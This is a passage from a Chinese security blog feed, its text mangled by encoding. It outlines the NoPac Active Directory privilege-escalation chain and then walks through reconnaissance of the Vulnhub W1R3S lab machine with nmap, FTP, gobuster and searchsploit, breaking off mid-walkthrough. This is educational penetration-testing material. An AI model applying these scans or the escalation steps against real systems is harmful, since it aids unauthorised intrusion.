title="CVE-2021-4227&amp;CVE-2021-42287(NoPac)"></a>CVE-2021-4227&amp;CVE-2021-42287(NoPac)</h2><p>è¿™ä¸¤ä¸ªCVEæ˜¯æ´»åŠ¨ç›®å½•åŸŸæœåŠ¡æ¼æ´ï¼Œè¿™ä¸¤ä¸ªæ¼æ´é…åˆåˆ©ç”¨å¯ä»¥ç»•è¿‡å®‰å…¨é™åˆ¶è¿›è¡Œæƒé™æå‡ã€‚</p><p>CVE-2021-42278 æ˜¯ä¸€ä¸ªå®‰å…¨ç»•è¿‡æ¼æ´ï¼Œå…è®¸é€šè¿‡ä¿®æ”¹æœºå™¨è´¦æˆ·çš„sAMAccountNameå±æ€§æ¥å†’å……åŸŸæ§åˆ¶å™¨ã€‚ä¸æ ‡å‡†ç”¨æˆ·è´¦æˆ·ç›¸æ¯”ï¼Œæœºå™¨è´¦æˆ·çš„åç§°æœ«å°¾é™„åŠ äº†â€œ$â€ç¬¦å·ï¼Œä½†å®é™…ä¸­ï¼ŒADå¹¶æ²¡æœ‰éªŒè¯åŸŸå†…æœºå™¨è´¦æˆ·ä¸­æ˜¯å¦å…·æœ‰â€œ$â€ï¼Œå¯¼è‡´æœºå™¨è´¦æˆ·å¯ä»¥è¢«å‡å†’ã€‚</p><p>CVE-2021-42287æ˜¯å½±å“Kerberosç‰¹æƒå±æ€§è¯ä¹¦(PAC)çš„å®‰å…¨ç»•è¿‡æ¼æ´ï¼Œå…è®¸é€šè¿‡å‡å†’åŸŸæ§åˆ¶å™¨ï¼Œä½¿å¯†é’¥åˆ†å‘ä¸­å¿ƒ(KDC)åˆ›å»ºé«˜æƒé™ç¥¨æ®ã€‚</p><p>æ ¹æ®è®¤è¯ Kerberos åè®®ï¼Œåœ¨è¯·æ±‚æœåŠ¡ç¥¨è¯å‰éœ€è¦å…ˆç­¾å‘ TGT(ç¥¨æ®æˆæƒå‡­è¯)ã€‚ä½†æ˜¯ï¼Œå½“ä¸ºæ´»åŠ¨ç›®å½•ä¸­ä¸å­˜åœ¨çš„è´¦æˆ·è¯·æ±‚æœåŠ¡ç¥¨è¯æ—¶ï¼Œå¯†é’¥åˆ†å‘ä¸­å¿ƒ(KDC)å°†åœ¨è¯¥è´¦æˆ·åä¸Šé™„åŠ â€œ$â€ç¬¦å·è¿›è¡Œæœç´¢ã€‚å°†è¿™ä¸€è¡Œä¸ºä¸ CVE-2021-42278 ç»“åˆï¼Œæµ‹è¯•äººå‘˜å¯ä»¥å®ç°åŸŸå†…æƒé™æå‡ï¼Œæ·±å…¥åŸç†åˆ†æå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.freebuf.com/vuls/317773.html">åŸŸå†…ææƒæ¼æ´CVE-2021-42287ä¸CVE-2021-42278åŸç†åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>åˆ›å»ºæœºå™¨è´¦æˆ·ï¼Œå‡è®¾ä¸ºHACKME$</li><li>æ¸…é™¤æœºå™¨è´¦æˆ· HACKME$çš„ servicePrincipalName å±æ€§</li><li>ä¿®æ”¹æœºå™¨è´¦æˆ· HACKME$çš„ sAMAccountNameå±æ€§ï¼Œä½¿å…¶æŒ‡å‘ä¸å¸¦â€œ$â€ç¬¦å·çš„åŸŸæ§åˆ¶å™¨è´¦æˆ·ã€‚</li><li>åˆ©ç”¨è´¦æˆ·DC-1è¯·æ±‚TGT</li><li>å°†æ–°å»ºçš„æœºå™¨è´¦æˆ·çš„ sAMAccountName å±æ€§æ¢å¤ä¸ºå…¶åŸå§‹å€¼(HACKME$)æˆ–å…¶ä»–ä»»ä½•å€¼ã€‚</li><li>åˆ©ç”¨S4Uä»£è¡¨åŸŸç®¡ç†å‘˜è¯·æ±‚å¯¹åº”æœåŠ¡çš„æœåŠ¡ç¥¨æ®(ST)ã€‚</li><li>ä¼ªé€ åŸŸç®¡ç†å‘˜è´¦æˆ·è·å¾—ç›¸åº”æœåŠ¡çš„ST</li></ol><p>å…·ä½“çš„ç­‰æœ‰æœºä¼šå†å¤ç°</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>w1r3s.v1.0.1é¶åœºå­¦ä¹ </title>
      <link href="/2024/04/19/w1r3s-v1-0-1%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/19/w1r3s-v1-0-1%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="é¶åœºä»‹ç»"><a href="#é¶åœºä»‹ç»" class="headerlink" title="é¶åœºä»‹ç»"></a>é¶åœºä»‹ç»</h1><p>è¿™æ˜¯ä¸€ä¸ªvulnhubé‡Œçš„ä¸€ä¸ªåˆçº§çš„æ¸—é€é¶åœºï¼Œä¸»è¦æ˜¯ä¸ºäº†ç†Ÿæ‚‰ä¸€ä¸‹å„ä¸ªä¿¡æ¯æœé›†å·¥å…·çš„ä½¿ç”¨ï¼Œä»¥åŠè·Ÿç€çº¢é˜Ÿç¬”è®°çš„è§†é¢‘æ¥å­¦ä¹ ä¸€ä¸‹æ¸—é€æ€è·¯æ‰“ä¸€ä¸‹åŸºç¡€ã€‚</p><p>è¿™é‡Œçš„ç¯å¢ƒå°±ä¸€å°é¶æœºï¼Œç›´æ¥æ‰“å¼€vmxå³å¯è¿›è¡Œæµ‹è¯•ã€‚</p><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><h2 id="ä¸»æœºå­˜æ´»æ¢æµ‹"><a href="#ä¸»æœºå­˜æ´»æ¢æµ‹" class="headerlink" title="ä¸»æœºå­˜æ´»æ¢æµ‹"></a>ä¸»æœºå­˜æ´»æ¢æµ‹</h2><p>æ¸—é€ç¬¬ä¸€æ­¥éœ€è¦åšçš„å°±æ˜¯ä¿¡æ¯æœé›†ï¼Œæˆ‘ä»¬å…ˆè¦ç¡®å®šä¸»æœºçš„å­˜æ´»ï¼Œç¡®è®¤æˆ‘ä»¬è¦æ”»å‡»çš„ä¸»æœºã€‚</p><p>è¿™é‡Œç”¨å‡ ç§æ–¹å¼æ¥è¿›è¡Œæ¢æµ‹ä¸»æœºå­˜æ´»</p><p><strong>namp</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">namp -sn 192.168.20.0/24 # -sn é‡‡ç”¨å››ç§ä¸åŒç±»å‹çš„æ•°æ®åŒ…æ¢æµ‹ç›®æ ‡ä¸»æœºæ˜¯å¦åœ¨çº¿ï¼Œåªè¿›è¡Œä¸»æœºæ¢æµ‹ä¸è¿›è¡Œç«¯å£æ‰«æ<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444504.png" alt="image-20240419192322268"></p><p><strong>arp-scan</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">arp-scan -l<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444505.png" alt="image-20240419192521545"></p><p>ç»è¿‡ä¸Šé¢ä¸¤ç§æ¢æµ‹ä¹‹åå¯ä»¥çŸ¥é“æˆ‘ä»¬çš„ç›®æ ‡é¶æœºå°±æ˜¯192.168.20.129ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯¹ç«¯å£è¿›è¡Œæ‰«ææœé›†ä¸€ä¸‹æœ‰å“ªäº›æœåŠ¡</p><h2 id="ç«¯å£æ‰«ææ¢æµ‹"><a href="#ç«¯å£æ‰«ææ¢æµ‹" class="headerlink" title="ç«¯å£æ‰«ææ¢æµ‹"></a>ç«¯å£æ‰«ææ¢æµ‹</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -sT 192.168.20.129 # -sT ä½¿ç”¨TCPè¿›è¡Œç«¯å£æ‰«æ<br><span class="hljs-meta prompt_">#</span><span class="language-bash">è¿˜å¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤æ‰«æåˆ¶å®šå…¶ä»–è¦æ±‚</span><br>nmap -sT --min-rate 10000 -p- 192.168.20.129 -oA nmap/ports# --min-rateï¼Œè®¾ç½®æœ€ä½å‘åŒ…é€Ÿç‡ï¼Œè¿™é‡Œä¸ºæ¯ç§’ä¸€ä¸‡æ¬¡ï¼›-p- æ˜¯æ‰«æ1-65535ç«¯å£çš„ç®€åŒ–å†™æ³•ï¼›-oA å°†ç»“æœçš„æ‰€æœ‰æ ¼å¼éƒ½å¯¼å‡ºæ¥ï¼Œå¦‚æœç«¯å£å¤šçš„è¯å¯ä»¥æ–¹ä¾¿æˆ‘ä»¬æŸ¥çœ‹ä¿å­˜ä¸‹æ¥<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444506.png" alt="image-20240419192855002"></p><p><img src="http://cdn.clown2024.cn/202407151444507.png" alt="image-20240419222045487"></p><p><img src="http://cdn.clown2024.cn/202407151444508.png" alt="image-20240419222030200"></p><p>å‘ç°è¿™é‡Œå¼€å¯äº†ftpã€sshã€httpã€mysqlæœåŠ¡</p><p>çº¢é˜Ÿç¬”è®°è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå¾ˆå¥½çš„ä¹ æƒ¯ï¼Œå°±æ˜¯æŠŠç«¯å£æå–å‡ºæ¥ï¼Œå¦‚æœç«¯å£å¤ªå¤šçš„è¯è¿™æ ·å°±ä¼šä¼šå¾ˆæ–¹ä¾¿ï¼Œç°åœ¨æˆ‘ä»¬ä»æ–‡ä»¶ä¸­å°†è¿™å››ä¸ªç«¯å£æå–å‡ºæ¥ï¼Œç„¶åæˆ‘ä»¬å°†å…¶èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡å°±å¯ä»¥ç›´æ¥ç”¨å°±ä¼šæ–¹ä¾¿å¾ˆå¤š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">grep open ports.nmap <br>grep open ports.nmap| awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; #å°±æ˜¯ä»¥æ–œæ ä¸ºåˆ†éš”ç¬¦ï¼Œç„¶åæ‰“å°ç¬¬ä¸€ä¸ªå­—æ®µ<br>grep open ports.nmap| awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27; #å°†å­—ç¬¦åˆå¹¶åˆ°ä¸€è¡Œå¹¶ä»¥é€—å·ä¸ºåˆ†éš”ç¬¦<br><span class="hljs-meta prompt_"># </span><span class="language-bash">è¿™é‡Œ awk é»˜è®¤ä¼šå°†æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªè®°å½•æ¥å¤„ç†</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444509.png" alt="image-20240419223441495"></p><p><img src="http://cdn.clown2024.cn/202407151444510.png" alt="image-20240419223456921"></p><p><img src="http://cdn.clown2024.cn/202407151444511.png" alt="image-20240419223537108"></p><p>è¿™æ ·å°±å¯ä»¥èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶å-på‚æ•°å°±èƒ½ç›´æ¥æ¢æµ‹è¯¥å˜é‡ä¸­çš„ç«¯å£äº†</p><p>æ¥ä¸‹æ¥ç¡®è®¤ç«¯å£ä¹‹åå°±å¯¹è¿™äº›ç«¯å£çš„å…·ä½“æœåŠ¡ä¿¡æ¯è¿›è¡Œæ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ports=$(grep open ports.nmap| awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;)<br>nmap -sT -sV -sC -O -p $ports -oA nmap/details<br><span class="hljs-meta prompt_"># </span><span class="language-bash">-sV æ¢æµ‹æœåŠ¡ç‰ˆæœ¬ï¼›-sC ä½¿ç”¨é»˜è®¤è„šæœ¬æ‰«æ -O æ¢æµ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444512.png" alt="image-20240419224852873"></p><p>è¿™æ ·æˆ‘ä»¬å°±æœé›†åˆ°äº†ç›¸å…³çš„ä¿¡æ¯å°±å¯ä»¥å¼€å§‹é€‰æ‹©æ€§å¼€å§‹å¯¹å…·ä½“ç«¯å£è¿›è¡Œæ¸—é€</p><p>è¿˜å¯ä»¥ä½¿ç”¨fscanç›´æ¥ä¸€æ¡å‘½ä»¤æ‰«å‡ºæ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./fscan_amd64 -h 192.168.20.129<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444513.png" alt="image-20240419225047643"></p><h1 id="å¼€å§‹æ¸—é€"><a href="#å¼€å§‹æ¸—é€" class="headerlink" title="å¼€å§‹æ¸—é€"></a>å¼€å§‹æ¸—é€</h1><h2 id="ftpæœåŠ¡"><a href="#ftpæœåŠ¡" class="headerlink" title="ftpæœåŠ¡"></a>ftpæœåŠ¡</h2><p>ä»ä¸Šé¢å¯ä»¥çœ‹æ˜¯ä¸€ä¸ªftpåŒ¿åæœåŠ¡å™¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ç™»é™†çœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ftp 192.168.20.129 #åŒ¿åftpç”¨æˆ·åéƒ½æ˜¯anonymous<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåˆ—ä¸€ä¸‹ftpå¸¸ç”¨å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æŸ¥çœ‹æŒ‡å®šåç¼€æ–‡ä»¶<br>dir .jpg<br><br>åˆ é™¤å•ä¸ªæ–‡ä»¶<br>delete æ–‡ä»¶å<br><br>åˆ é™¤å¤šä¸ªæ–‡ä»¶<br># æ ¼å¼ï¼šmdelete remote-files [ ...]<br>mdelete æ–‡ä»¶å<br><br>é‡å‘½åæ–‡ä»¶<br># æ ¼å¼ï¼šrename filename newfilename<br>rename test atest<br><br>ä¸Šä¼ æ–‡ä»¶<br># æ ¼å¼ï¼šput local-file [remote-file]<br>put /home/a.txt /mydata/b.txt<br><br>ä¸‹è½½å•ä¸ªæ–‡ä»¶<br># æ ¼å¼ï¼šget [remote-file] [local-file]<br>get /mydata/a.txt /apps/b.txt<br><br>ä¸‹è½½å¤šä¸ªæ–‡ä»¶<br># æ ¼å¼ï¼šmget filename [filename ....]<br>mget *.*<br><br>è¾“å…¥?å¯ä»¥æŸ¥çœ‹æ‰€æœ‰æŒ‡ä»¤<br></code></pre></td></tr></table></figure><p>ç™»é™†ä¹‹åçœ‹çœ‹éƒ½æœ‰ä»€ä¹ˆ</p><p><img src="http://cdn.clown2024.cn/202407151444514.png" alt="image-20240419225708258"></p><p>æˆ‘ä»¬å¯ä»¥è¾“å…¥binaryåˆ‡æ¢æˆäºŒè¿›åˆ¶ä¼ è¾“æ¨¡å¼ï¼Œé˜²æ­¢æœ‰äº›å¯æ‰§è¡Œæ–‡ä»¶æŸå</p><p><img src="http://cdn.clown2024.cn/202407151444515.png" alt="image-20240419230254565"></p><p>ç„¶åæˆ‘ä»¬è¿›å»è¿™äº›ç›®å½•æŠŠæ–‡ä»¶éƒ½ä¸‹è½½ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>prompt</strong>å‘½ä»¤å…³æ‰äº¤äº’æ¨¡å¼ï¼Œè¿™æ ·ä¸‹è½½æ–‡ä»¶å°±ä¸éœ€è¦æˆ‘ä»¬ç¡®è®¤æ›´åŠ æ–¹ä¾¿</p><p><img src="http://cdn.clown2024.cn/202407151444516.png" alt="image-20240419230904141"></p><p>ç„¶åå»æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶å†…å®¹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæç¤º</p><p><img src="http://cdn.clown2024.cn/202407151444517.png" alt="image-20240419231041052"></p><p>ç»™äº†ä¸€ä¸²md5å’Œbase64çš„å­—ç¬¦ä¸²ï¼Œå»è§£ç çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆç”¨</p><p>md5è§£å¯†å‡ºæ¥ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">This is not a password<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444518.png" alt="image-20240419231247620"></p><p>base64è§£å¯†å‡ºæ¥</p><p><img src="http://cdn.clown2024.cn/202407151444519.png" alt="image-20240419231341272"></p><p>ç„¶åå°±æ˜¯ä¸€äº›å‘˜å·¥åå•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Naomi.W - Manager<br>Hector.A - IT Dept<br>Joseph.G - Web Design<br>Albert.O - Web Design<br>Gina.L - Inventory<br>Rico.D - Human Resources<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ä¸‹é¢çš„ç¿»è½¬æ–‡å­—ï¼Œè¿™é‡Œæˆªå›¾æ—‹è½¬ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151444520.png" alt="image-20240419231602348"></p><p>ä¼¼ä¹å°±æ˜¯æç¤ºä»è¿™é‡Œå…¥æ‰‹ä¸å¤ªè¡Œ</p><p>ç„¶åè¿˜å‘ç°äº†ä¸€ä¸ªæœ‰æ„æ€çš„ï¼Œè¿™äº›æ–‡å­—logoç½‘ä¸Šå¯ä»¥æ‰¾åˆ°asciiè½¬logoçš„ç½‘ç«™ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªç½‘ç«™ï¼š<a href="https://patorjk.com/software/taag/#p=testall&f=Isometric2&t=helloworld%0A">https://patorjk.com/software/taag/#p=testall&amp;f=Isometric2&amp;t=helloworld%0A</a></p><p><img src="http://cdn.clown2024.cn/202407151444521.png" alt="image-20240419231939106"></p><h2 id="80ç«¯å£"><a href="#80ç«¯å£" class="headerlink" title="80ç«¯å£"></a>80ç«¯å£</h2><p>è¿™é‡Œä¸å¤ªè¡Œå°±å¼€å§‹çœ‹ä¸€äº›ä»–çš„httpé¡µé¢å§</p><p>è¿›å»ä¹‹åæ˜¯ä¸€ä¸ªapacheçš„é¡µé¢</p><p><img src="http://cdn.clown2024.cn/202407151444522.png" alt="image-20240419232336159"></p><p>æ‰¾ä¸åˆ°ä»€ä¹ˆèƒ½ç”¨çš„ä¸œè¥¿å°±ç›´æ¥å¼€å§‹ç«¯å£æ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">dirsearch -u &quot;http://192.168.20.129/&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444523.png" alt="image-20240419232812060"></p><p>è¿™é‡Œè¿˜å­¦åˆ°ä¸€ä¸ªæ–°çš„ç›®å½•æ‰«æå·¥å…·gobusterï¼Œä»–çš„æ‰«æå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gobuster dir -u &quot;http://192.168.20.129/&quot; --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å…¶ä»–çš„å­—å…¸å¯ä»¥å»è¯¥ç›®å½•ä¸‹æŸ¥çœ‹</span><br></code></pre></td></tr></table></figure><blockquote><p>gobusterçš„ä¸‰ç§æ¨¡å¼</p><p>dirï¼šä¼ ç»Ÿçš„ç›®å½•çˆ†ç ´æ¨¡å¼ï¼›<br>dnsï¼šDNSå­åŸŸåçˆ†ç ´æ¨¡å¼ï¼›<br>vhostï¼šè™šæ‹Ÿä¸»æœºçˆ†ç ´æ¨¡å¼ï¼›</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444524.png" alt="image-20240419233246596"></p><p>ç°åœ¨å»ç›¸å…³ç«¯å£çœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿</p><p>å‰é¢ä¸¤ä¸ªéƒ½è®¿é—®ä¸äº†ï¼Œæœ€åä¸€ä¸ªæœ‰ä¸œè¥¿ï¼Œä¼¼ä¹æ˜¯ä¸€ä¸ªcmsçš„å®‰è£…ç•Œé¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://192.168.20.129/administrator/installation/<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444525.png" alt="image-20240419233413396"></p><p><img src="http://cdn.clown2024.cn/202407151444526.png" alt="image-20240419233448024"></p><p>è¿™é‡Œå“å¾—æˆ‘ä¸æ•¢ç»§ç»­äº†ï¼Œè¦æ˜¯è¦†ç›–äº†è¿™å’‹æ•´æ­£å¸¸äººè°æŠŠè¿™ç©æ„æ”¾ä¸Šæ¥å•Šï¼ˆ</p><p>ç„¶åéšä¾¿å¡«äº†ä¸œè¥¿è¯•äº†ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151444527.png" alt="image-20240419233619820"></p><p>rootç”¨æˆ·æ˜¯æ— æ³•åˆ›å»ºçš„</p><p>emmmç„¶åæœ‰ç‚¹æ— ä»å…¥æ‰‹äº†ï¼Œå› ä¸ºä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆcmsï¼Œè¿™æ˜¯æˆ‘æŠŠé¼ æ ‡ç§»åˆ°é—®å·ä¸Šåœ¨åº•ä¸‹çªç„¶æœ‰äº†æç¤ºï¼Œæ˜¯Cuppa CMS</p><p><img src="http://cdn.clown2024.cn/202407151444528.png" alt="image-20240419234002096"></p><p>è¿™æ ·å°±å¥½åŠäº†ï¼Œå¯ä»¥å»æœä¸€ä¸‹è¿™ä¸ªCMSæœ‰æ²¡æœ‰æ¼æ´ï¼Œéš¾ç»·æœäº†ä¸€ä¸‹éƒ½æ˜¯ç›´æ¥æŒ‡å‘è¿™ä¸ªé¶åœºçš„wpã€‚ã€‚</p><p>é‚£è¿™é‡Œå°±å­¦ä¹ çº¢é˜Ÿç¬”è®°é‡Œçš„æœç´¢æ–¹æ³•ï¼Œç”¨åˆ°äº†<strong>searchsploit</strong>å·¥å…·</p><blockquote><p><code>searchsploit</code>æ˜¯ä¸€ä¸ªç”¨äº<code>Exploit-DB</code>çš„å‘½ä»¤è¡Œæœç´¢å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾æ¸—é€æ¨¡å—ã€‚</p><p>Exploit-DBæ˜¯ä¸€ä¸ªæ¼æ´åº“ï¼ŒKali Linuxä¸­ä¿å­˜äº†ä¸€ä¸ªè¯¥æ¼æ´åº“çš„æ‹·è´ï¼Œåˆ©ç”¨ä¸Šé¢æåˆ°çš„å‘½ä»¤å°±å¯ä»¥æŸ¥æ‰¾éœ€è¦çš„æ¸—é€æ¨¡å—ï¼Œå®ƒå°†æœç´¢æ‰€æœ‰çš„æ¼æ´å’Œshellcodeè€Œä¸”è¯¥æ¼æ´åº“æ˜¯ä¿å­˜åœ¨æœ¬åœ°çš„ï¼Œåœ¨æ²¡æœ‰ç½‘ç»œçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p></blockquote><p>è¿™é‡Œcopyä¸€ä¸‹åˆ«äººç¿»è¯‘çš„é€‰é¡¹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://juejin.cn/post/7026899204446355486">https://juejin.cn/post/7026899204446355486</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Usage: searchsploit [options] term1 [term2] ... [termN]<br>â€‹<br>==========<br> Examples<br>==========<br>  searchsploit afd windows local<br>  searchsploit -t oracle windows<br>  searchsploit -p 39446<br>  searchsploit linux kernel 3.2 --exclude=&quot;(PoC)|/dos/&quot;<br>â€‹<br>  For more examples, see the manual: https://www.exploit-db.com/searchsploit/<br>â€‹<br>=========<br> Options<br>=========<br> Â  -c, --case Â  Â  [Term] Â  Â   åŒºåˆ†å¤§å°å†™(é»˜è®¤ä¸åŒºåˆ†å¤§å°å†™)<br> Â  -e, --exact Â   [Term] Â  Â   å¯¹exploitæ ‡é¢˜è¿›è¡ŒEXACTåŒ¹é… (é»˜è®¤ä¸º AND) [Implies &quot;-t&quot;].<br> Â  -h, --help Â  Â  Â  Â  Â  Â  Â  Â  æ˜¾ç¤ºå¸®åŠ©<br> Â  -j, --json Â  Â  [Term] Â  Â   ä»¥JSONæ ¼å¼æ˜¾ç¤ºç»“æœ<br> Â  -m, --mirror Â  [EDB-ID] Â   æŠŠä¸€ä¸ªexpæ‹·è´åˆ°å½“å‰å·¥ä½œç›®å½•,å‚æ•°ååŠ ç›®æ ‡id<br> Â  -o, --overflow [Term] Â  Â   Exploitæ ‡é¢˜è¢«å…è®¸æº¢å‡ºå…¶åˆ—<br> Â  -p, --path Â  Â  [EDB-ID] Â   æ˜¾ç¤ºæ¼æ´åˆ©ç”¨çš„å®Œæ•´è·¯å¾„ï¼ˆå¦‚æœå¯èƒ½ï¼Œè¿˜å°†è·¯å¾„å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼‰ï¼Œåé¢è·Ÿæ¼æ´IDå·<br> Â  -t, --title Â   [Term] Â  Â   ä»…ä»…æœç´¢æ¼æ´æ ‡é¢˜ï¼ˆé»˜è®¤æ˜¯æ ‡é¢˜å’Œæ–‡ä»¶çš„è·¯å¾„ï¼‰<br> Â  -u, --update Â  Â  Â  Â  Â  Â  Â  æ£€æŸ¥å¹¶å®‰è£…ä»»ä½•exploitdbè½¯ä»¶åŒ…æ›´æ–°ï¼ˆdebæˆ–gitï¼‰<br> Â  -w, --www Â  Â   [Term] Â  Â   æ˜¾ç¤ºExploit-DB.comçš„URLè€Œä¸æ˜¯æœ¬åœ°è·¯å¾„ï¼ˆåœ¨çº¿æœç´¢ï¼‰<br> Â  -x, --examine  [EDB-ID] Â   ä½¿ç”¨$ PAGERæ£€æŸ¥ï¼ˆå‰¯æœ¬ï¼‰Exp<br> Â  Â  Â  --colour Â  Â  Â  Â  Â  Â  Â  æœç´¢ç»“æœä¸é«˜äº®æ˜¾ç¤ºå…³é”®è¯<br> Â  Â  Â  --id Â  Â  Â  Â  Â  Â  Â  Â  Â  æ˜¾ç¤ºEDB-ID<br> Â  Â  Â  --nmap Â  Â  [file.xml]  ä½¿ç”¨æœåŠ¡ç‰ˆæœ¬æ£€æŸ¥Nmap XMLè¾“å‡ºä¸­çš„æ‰€æœ‰ç»“æœï¼ˆä¾‹å¦‚ï¼šnmap -sV -oX file.xmlï¼‰<br> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   ä½¿ç”¨â€œ-vâ€ï¼ˆè¯¦ç»†ï¼‰æ¥å°è¯•æ›´å¤šçš„ç»„åˆ<br> Â  Â  Â  --exclude=&quot;term&quot; Â  Â  Â  ä»ç»“æœä¸­åˆ é™¤å€¼ã€‚é€šè¿‡ä½¿ç”¨â€œ|â€åˆ†éš”å¤šä¸ªå€¼<br> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   ä¾‹å¦‚--exclude=â€œterm1 | term2 | term3â€ã€‚<br>â€‹<br>=======<br> Notes<br>=======<br> * ä½ å¯ä»¥ä½¿ç”¨ä»»æ„æ•°é‡çš„æœç´¢è¯ã€‚<br> * Search terms are not case-sensitive (by default), and ordering is irrelevant.<br> Â  * æœç´¢æœ¯è¯­ä¸åŒºåˆ†å¤§å°å†™(é»˜è®¤æƒ…å†µä¸‹)ï¼Œè€Œæ’åºåˆ™æ— å…³ç´§è¦ã€‚<br> Â  * å¦‚æœä½ æƒ³ç”¨ç²¾ç¡®çš„åŒ¹é…æ¥è¿‡æ»¤ç»“æœï¼Œè¯·ä½¿ç”¨ç”¨ -e å‚æ•°<br> * ä½¿ç”¨&#x27; - t &#x27;å°†æ–‡ä»¶çš„è·¯å¾„æ’é™¤ï¼Œä»¥è¿‡æ»¤æœç´¢ç»“æœ<br> Â  * åˆ é™¤è¯¯æŠ¥(ç‰¹åˆ«æ˜¯åœ¨æœç´¢ä½¿ç”¨æ•°å­—æ—¶ - i.e. ç‰ˆæœ¬).<br> * å½“æ›´æ–°æˆ–æ˜¾ç¤ºå¸®åŠ©æ—¶ï¼Œæœç´¢é¡¹å°†è¢«å¿½ç•¥ã€‚<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å°±ç›´æ¥æœç´¢cuppa cmsç›¸å…³çš„æ¼æ´</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">searchsploit cuppa cms<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444529.png" alt="image-20240419235101032"></p><p>å‘ç°æœ‰ä¸€æ¡expæˆ‘ä»¬å¯ä»¥æŠŠä»–ä¸‹è½½ä¸‹æ¥çœ‹ä¸€ä¸‹åˆ©ç”¨æ–¹å¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">searchsploit cuppa cms -m 25971<br>cat 25971.txt<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444530.png" 